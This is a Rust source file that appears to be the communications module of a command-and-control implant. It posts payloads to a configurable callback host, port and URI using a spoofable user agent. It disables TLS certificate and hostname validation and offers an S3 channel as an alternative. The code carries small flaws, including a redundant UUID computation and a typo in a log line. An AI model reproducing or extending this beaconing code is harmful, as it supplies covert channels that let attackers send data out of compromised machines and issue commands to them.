use reqwest::blocking::Client;
use std::time::Duration;
use serde_json::Value;
use base64::{engine::general_purpose, Engine as _};
use crate::config;
use crate::s3_transport;


pub fn send_request(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    if config::use_s3 {
        s3_transport::send_and_receive(payload)
    } else {
        send_request_internal(payload, true)
    }
}

pub fn send_request_raw(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    if config::use_s3 {
        s3_transport::send_and_receive(payload)
    } else {
        send_request_internal(payload, false)
    }
}

fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn std::error::Error>> {
    println!("[SENDING] {}", payload);

    let uuid = config::UUID.read().unwrap();
    let full_msg = format!("{}{}", *uuid, payload);
    let encoded = if encode {
        let uuid = config::UUID.read().unwrap();
        let full_msg = format!("{}{}", *uuid, payload);
        general_purpose::STANDARD.encode(full_msg)
    } else {
        payload.to_string()
    };

    let url = format!(
        "{}://{}:{}/{}",
        if config::use_ssl { "https" } else { "http" },
        config::callback_host,
        config::callback_port,
        config::post_uri
    );

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()?;
    let res = client
        .post(&url)
        .header("Content-Type", "application/json")
        .header("User-Agent", config::user_agent)
        .timeout(Duration::from_secs(10))
        .body(encoded)
        .send()?;

    let body = res.text()?;
    println!("[RECEeved] {}", body);
    // skip base64 decode
    Ok(body)
}

pub fn send_request_with_response(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    if config::use_s3 {
        s3_transport::send_and_receive_json(payload)
    } else {
        let response_text = send_request_internal(payload, true)?;
        let json: Value = serde_json::from_str(&response_text)?;
        Ok(json)
    }
}

pub fn send_request_with_response_raw(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    if config::use_s3 {
        s3_transport::send_and_receive_json(payload)
    } else {
        let response_text = send_request_internal(payload, false)?;
        let json: Value = serde_json::from_str(&response_text)?;
        Ok(json)
    }
}
